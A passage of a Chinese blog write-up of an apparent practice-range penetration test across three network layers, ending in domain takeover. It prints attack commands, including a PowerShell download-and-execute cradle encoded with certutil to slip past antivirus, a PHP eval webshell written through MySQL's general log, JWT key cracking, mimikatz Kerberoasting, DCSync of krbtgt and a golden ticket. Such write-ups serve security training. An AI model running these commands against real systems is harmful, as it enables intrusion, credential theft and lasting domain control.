+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635855931/Xnip2021-11-02_20-08-22_ze0lc0.png"></p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635855938/Xnip2021-11-02_20-08-57_kv2vap.png"></p>
+<p>查一下有无杀软</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exec master.dbo.xp_cmdshell &#x27;tasklist /svc&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635856164/Xnip2021-11-02_20-28-24_fpskcw.png"></p>
+<p>发现存在火绒安全软件</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635856166/Xnip2021-11-02_20-28-34_gpfw2r.png"></p>
+<h2 id="DATA1-Bypass-火绒上线-cs"><a href="#DATA1-Bypass-火绒上线-cs" class="headerlink" title="DATA1 Bypass 火绒上线 cs"></a>DATA1 Bypass 火绒上线 cs</h2><p>这里我用 certutil 将 payload 编码 echo 到目标主机执行，唯一不好就是会弹窗，后续再改进</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c echo IEX ((new-object net.webclient).downloadstring(&#x27;http://1.1.1.1&#x27;)) | powershell -  #payload</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertUtil -encode payload.txt payload1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635857571/Xnip2021-11-02_20-37-21_e6o0yb.png"></p>
+<p>找到一个可写目录然后 echo 到目标主机中</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635857610/Xnip2021-11-02_20-45-48_vglenb.png"></p>
+<p>在目标主机解码运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertUtil -decode c:\360Downloads\shell.txt c:\360Downloads\shell.bat</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635857650/Xnip2021-11-02_20-47-45_edkdbh.png"></p>
+<p>上线是 mssql 数据库权限，烂土豆提权至 system 权限</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635857689/Xnip2021-11-02_20-49-31_bmqfbz.png"></p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635857688/Xnip2021-11-02_20-52-22_bghquk.png"></p>
+<p>跑一下账户明文密码</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635865952/Xnip2021-11-02_23-11-49_q8w5xg.png"></p>
+<p>dumphash</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635865952/Xnip2021-11-02_23-12-10_rdyhcm.png"></p>
+<p>至此 WEB1 和 DATA1 都已经拿下了</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635857951/Xnip2021-11-02_20-58-31_bswpdi.png"></p>
+<h2 id="DATA1-内网信息收集"><a href="#DATA1-内网信息收集" class="headerlink" title="DATA1 内网信息收集"></a>DATA1 内网信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>
+
+
+
+<p>双网卡主机，又发现一个网段</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635866051/Xnip2021-11-02_23-14-00_kqnrxr.png"></p>
+<p>扫描一下内网存活和端口</p>
+<p>目标 192.168.183.136 开了 80 这台机器就是 WEB2，可以再探测一下主机名确定一下</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635859702/Xnip2021-11-02_21-28-07_b5whhl.png"></p>
+<p>cs 开 socks 代理进内网访问 <a target="_blank" rel="noopener" href="http://192.168.183.136/%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%98%AF%E4%B8%80%E4%B8%AA">http://192.168.183.136/，发现是一个</a> jwt 样例页面</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635860574/Xnip2021-11-02_21-34-52_w4b10m.png"></p>
+<p>jwt 可以爆破 token</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635860581/Xnip2021-11-02_21-38-02_jwy31k.png"></p>
+<h2 id="JWT-Token-爆破"><a href="#JWT-Token-爆破" class="headerlink" title="JWT Token 爆破"></a>JWT Token 爆破</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC8xMC4xMC4xLjEzNSIsImF1ZCI6Imh0dHA6XC9cLzEwLjEwLjEuMTM1IiwiaWF0IjoxNjM1ODU5Nzk4LCJuYmYiOjE2MzU4NTk4MDgsImV4cCI6MTYzNTg2MDM5OCwiZGF0YSI6eyJ1c2VyaWQiOjEsInVzZXJuYW1lIjoiZGVtbyJ9fQ.Nix1dQr0cu6OVZmjgCHJ7wk3AaztGZH0ubZNFlKb9fg -C -d /Users/lin/Documents/security/dic/自己收集的/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>成功爆破出了密码</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635860935/Xnip2021-11-02_21-48-37_ovtscz.png"></p>
+<p>我刚开始以为是伪造一个 token 然后以管理员身份登陆后台之类的，但是我发现登陆之后只有用户名变了，没有其它任何可以利用的地方，我才发现思路错了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt token 密钥：[+] Qweasdzxc5 is the CORRECT key!</span><br></pre></td></tr></table></figure>
+
+<p>想了半天也不知道这个密钥有啥用，无奈问了下月师傅，他说这个环境是 phpstudy pro 搭建的，说有 phpmyadmin</p>
+<p>试了试几个常用的 phpmyadmin 路径，最终发现路径为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.183.136/phpMyAdmin4.8.5/</span><br></pre></td></tr></table></figure>
+
+<p>这里确实有点脑洞，后来结束看了其他师傅的 WP，有的是扫目录发现了 phpmyadmin 的日志文件，有的是识别出了是 phpstudy pro 的环境，只能说我太菜了</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635861501/Xnip2021-11-02_21-56-51_gkidun.png"></p>
+<p>使用 root&#x2F;Qweasdzxc5 登陆 phpmyadmin，然后就是常规的操作，往根目录写 webshell 或者写日志 getshell</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635861598/Xnip2021-11-02_21-59-48_hjooas.png"></p>
+<h2 id="phpmyadmin-写日志-getshell"><a href="#phpmyadmin-写日志-getshell" class="headerlink" title="phpmyadmin 写日志 getshell"></a>phpmyadmin 写日志 getshell</h2><p>查看日志信息</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635863373/Xnip2021-11-02_22-20-01_pqnnca.png"></p>
+<p>打开 general_log 日志读写功能</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log=&#x27;on&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635863403/Xnip2021-11-02_22-20-22_trzdbt.png"></p>
+<p>更改日志存放路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log_file=&#x27;C:/phpstudy_pro/WWW/shell.php&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635863441/Xnip2021-11-02_22-24-12_wy7dto.png"></p>
+<p>写 webshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select &#x27;&lt;?php eval($_POST[pass]);?&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635863453/Xnip2021-11-02_22-28-37_zfjri7.png"></p>
+<p>蚁剑配置代理连接</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635863621/Xnip2021-11-02_22-32-18_nl8k7j.png"></p>
+<h2 id="WEB2-上线-cs"><a href="#WEB2-上线-cs" class="headerlink" title="WEB2 上线 cs"></a>WEB2 上线 cs</h2><p>目标主机无杀软、但是不出网、需要转发上线，在 DATA1 上建立一个监听</p>
+<p>以 DATA1 为监听生成一个 exe 后门上传到 WEB2 上执行</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635865952/Xnip2021-11-02_22-36-19_xryii6.png"></p>
+<p>WEB2 正向上线</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635866243/Xnip2021-11-02_23-17-09_toipcw.png"></p>
+<h2 id="WEB2-内网信息收集"><a href="#WEB2-内网信息收集" class="headerlink" title="WEB2 内网信息收集"></a>WEB2 内网信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>
+
+<p>双网卡主机、域内成员机、有一个域 ack123.com，并且还有一个内网网段，第三层内网了</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635866501/Xnip2021-11-02_23-21-23_gy8bqd.png"></p>
+<p>定位域控，我这里省事就直接 ping 了，可以用 cs 相关插件再确定一下，一般 dns 服务器就是域控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping ack123.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635866900/Xnip2021-11-02_23-28-06_dgdhpe.png"></p>
+<p>跑一波账户明文密码</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635866499/Xnip2021-11-02_23-19-56_l3pbnz.png"></p>
+<p>dumphash</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635866499/Xnip2021-11-02_23-20-21_rx46rk.png"></p>
+<h2 id="spn-票据爆破"><a href="#spn-票据爆破" class="headerlink" title="spn 票据爆破"></a>spn 票据爆破</h2><p>试了一波打域控方法无果，最后发现有 spn</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635905450/Xnip2021-11-03_10-10-38_i79g83.png"></p>
+<h3 id="spn-简介"><a href="#spn-简介" class="headerlink" title="spn 简介"></a>spn 简介</h3><p>SPN，ServicePrincipal Names，即服务主体名称，是服务实例（比如：HTTP、SMB、MySQL 等服务）在使用 Kerberos 身份验证的网络上的唯一标识符，其由服务类、主机名和端口组成。Kerberos 认证过程使用 SPN 将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置 SPN。在使用 Kerberos 身份验证的网络中，必须在内置计算机帐户或域用户帐户下为服务器注册 SPN。对于内置机器帐户，SPN 将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户手动注册 SPN。</p>
+<p>SPN 分为两种类型：</p>
+<p>・一种是注册在活动目录的机器帐户（Computers）下。当一个服务的权限为 Local System 或 Network Service 时，则 SPN 注册在机器帐户（Computers）下。・另一种是注册在活动目录的域用户帐户（Users）下，当一个服务的权限为一个域用户时，则 SPN 注册在域用户帐户（Users）下。</p>
+<h3 id="SPN-服务主体名称发现"><a href="#SPN-服务主体名称发现" class="headerlink" title="SPN 服务主体名称发现"></a>SPN 服务主体名称发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setspn -Q */*    # 查看当前域内所有的 SPN</span><br><span class="line">setspn -T whoamianony.org -Q */*    # 查看指定域 whoamianony.org 注册的SPN, 如果指定域不存在, 则默认切换到查找本域的 SPN</span><br><span class="line">setspn -L &lt;username&gt;/&lt;hostname&gt;    # 查找指定用户/主机名注册的 SPN</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用-GetUserSPNs-ps1-脚本"><a href="#使用-GetUserSPNs-ps1-脚本" class="headerlink" title="使用 GetUserSPNs.ps1 脚本"></a>使用 GetUserSPNs.ps1 脚本</h3><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast.git">https://github.com/nidem/kerberoast.git</a></p>
+<p>GetUserSPNs 是 Kerberoast 工具集中的一个 PowerShell 脚本，可以用来查询域内用户注册的 SPN。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\GetUserSPNs.ps1</span><br></pre></td></tr></table></figure>
+
+<p>既然有 spn 服务，那么我们可以使用 mimikatz 请求指定 SPN 的服务票据，然后导出爆破域管密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ask /target:mysql/16server-dc1.ack123.com  #请求mysql的服务票据</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635905427/Xnip2021-11-03_10-10-06_irrxtd.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list    # 列出服务票据</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635906079/Xnip2021-11-03_10-13-46_htlv6z.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /export #导出服务票据</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635906084/Xnip2021-11-03_10-15-04_x3kgfx.png"></p>
+<p>使用工具爆破服务票据得到域管密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cracking 1 tickets...</span><br><span class="line">found password for ticket 0: P@55w0rd!  File: 1-40a10000-12server-web2$@mysql~16server-dc1.ack123.com-ACK123.COM.kirbi</span><br><span class="line">Successfully cracked all tickets</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635906154/Xnip2021-11-03_10-22-07_afxdda.png"></p>
+<p>使用 cs 自带工具扫一下存活</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635906344/Xnip2021-11-03_10-25-28_zoluca.png"></p>
+<h2 id="DC-上线"><a href="#DC-上线" class="headerlink" title="DC 上线"></a>DC 上线</h2><p>已经有了域管密码，直接 psexec 横向 DC 即可，首先建立一个 smb 的监听</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635908606/Xnip2021-11-03_11-02-05_gv9tlh.png"></p>
+<p>psexec 横向</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635908606/Xnip2021-11-03_11-03-08_lnwqpp.png"></p>
+<p>DC 上线</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635908696/Xnip2021-11-03_11-04-44_vi6pii.png"></p>
+<h2 id="DATA2-上线"><a href="#DATA2-上线" class="headerlink" title="DATA2 上线"></a>DATA2 上线</h2><p>同样直接 psexec 横向即可</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635921833/Xnip2021-11-03_14-43-20_m7ndye.png"></p>
+<h2 id="权限维持之黄金票据"><a href="#权限维持之黄金票据" class="headerlink" title="权限维持之黄金票据"></a>权限维持之黄金票据</h2><p>抓 krbtgt 账户 hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /domain:ack123.com /user:krbtgt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635922097/Xnip2021-11-03_14-47-10_zpuend.png"></p>
+<p>在 WEB2、DATA2 上制作黄金票据</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635922096/Xnip2021-11-03_14-48-02_s5v9eh.png"></p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635922130/Xnip2021-11-03_14-48-36_pprrq7.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list #列出票据</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635922277/Xnip2021-11-03_14-51-05_fvuujf.png"></p>
+<p>访问一下域控看看票据是否有效</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635922372/Xnip2021-11-03_14-52-20_t4pns1.png"></p>
+<h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>感谢月师傅幸苦搭建的靶场环境、三层内网渗透很有意思、在渗透过程中也发现了自身许多技术的不足（就是菜），靶场体验不错，这篇文章是考核之后复现的，当时 WP 没写那么仔细，因为已经打过一遍，难免会有白盒测试的思想影响，因此文章逻辑可能不是那么严谨，有些步骤也少了，最后附上一张全部上线的图，这个靶场到此结束了</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635922632/Xnip2021-11-03_14-56-56_jzmwtw.png"></p>
+
+  </div>
+</article>
+
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/vlog/">vlog</a></li>
+         
+          <li><a href="/gallery/">Photo</a></li>
+         
+          <li><a href="/friends/">Friends</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E8%80%83%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">主要考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%8B%93%E6%89%91%E5%9B%BE"><span class="toc-number">3.</span> <span class="toc-text">靶场拓扑图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-cookie-%E4%BB%A5%E7%AE%A1%E7%90%86%E5%91%98%E8%BA%AB%E4%BB%BD%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="toc-number">5.</span> <span class="toc-text">伪造 cookie 以管理员身份登录后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%A8%A1%E7%89%88%E5%A4%84-getshell"><span class="toc-number">6.</span> <span class="toc-text">后台模版处 getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB1-Bypass-%E6%9D%80%E8%BD%AF%E4%B8%8A%E7%BA%BF-cs"><span class="toc-number">7.</span> <span class="toc-text">WEB1 Bypass 杀软上线 cs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">8.</span> <span class="toc-text">WEB1 内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DATA1-Bypass-%E7%81%AB%E7%BB%92%E4%B8%8A%E7%BA%BF-cs"><span class="toc-number">9.</span> <span class="toc-text">DATA1 Bypass 火绒上线 cs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DATA1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">10.</span> <span class="toc-text">DATA1 内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT-Token-%E7%88%86%E7%A0%B4"><span class="toc-number">11.</span> <span class="toc-text">JWT Token 爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadmin-%E5%86%99%E6%97%A5%E5%BF%97-getshell"><span class="toc-number">12.</span> <span class="toc-text">phpmyadmin 写日志 getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB2-%E4%B8%8A%E7%BA%BF-cs"><span class="toc-number">13.</span> <span class="toc-text">WEB2 上线 cs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB2-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">14.</span> <span class="toc-text">WEB2 内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#spn-%E7%A5%A8%E6%8D%AE%E7%88%86%E7%A0%B4"><span class="toc-number">15.</span> <span class="toc-text">spn 票据爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#spn-%E7%AE%80%E4%BB%8B"><span class="toc-number">15.1.</span> <span class="toc-text">spn 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SPN-%E6%9C%8D%E5%8A%A1%E4%B8%BB%E4%BD%93%E5%90%8D%E7%A7%B0%E5%8F%91%E7%8E%B0"><span class="toc-number">15.2.</span> <span class="toc-text">SPN 服务主体名称发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-GetUserSPNs-ps1-%E8%84%9A%E6%9C%AC"><span class="toc-number">15.3.</span> <span class="toc-text">使用 GetUserSPNs.ps1 脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DC-%E4%B8%8A%E7%BA%BF"><span class="toc-number">16.</span> <span class="toc-text">DC 上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DATA2-%E4%B8%8A%E7%BA%BF"><span class="toc-number">17.</span> <span class="toc-text">DATA2 上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">18.</span> <span class="toc-text">权限维持之黄金票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#END"><span class="toc-number">19.</span> <span class="toc-text">END</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/400502091/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/400502091/&text=暗月九月考核项目靶场 WriteUp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/400502091/&title=暗月九月考核项目靶场 WriteUp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/400502091/&is_video=false&description=暗月九月考核项目靶场 WriteUp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=暗月九月考核项目靶场 WriteUp&body=Check out this article: http://example.com/posts/400502091/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/400502091/&title=暗月九月考核项目靶场 WriteUp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/400502091/&title=暗月九月考核项目靶场 WriteUp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/400502091/&title=暗月九月考核项目靶场 WriteUp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/400502091/&title=暗月九月考核项目靶场 WriteUp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/400502091/&name=暗月九月考核项目靶场 WriteUp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/400502091/&t=暗月九月考核项目靶场 WriteUp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'Ku71Pva4EFeKIH5y64LCYVwp-gzGzoHsz',
+            appKey: 'wqnsWKV8eVHemIwCa9vo9vRg',
+            placeholder: '快来评论一下吧',
+            avatar: 'robohash'
+        })
+    </script>
+
+    
+<!-- utterances Comments -->
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":200,"height":350,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
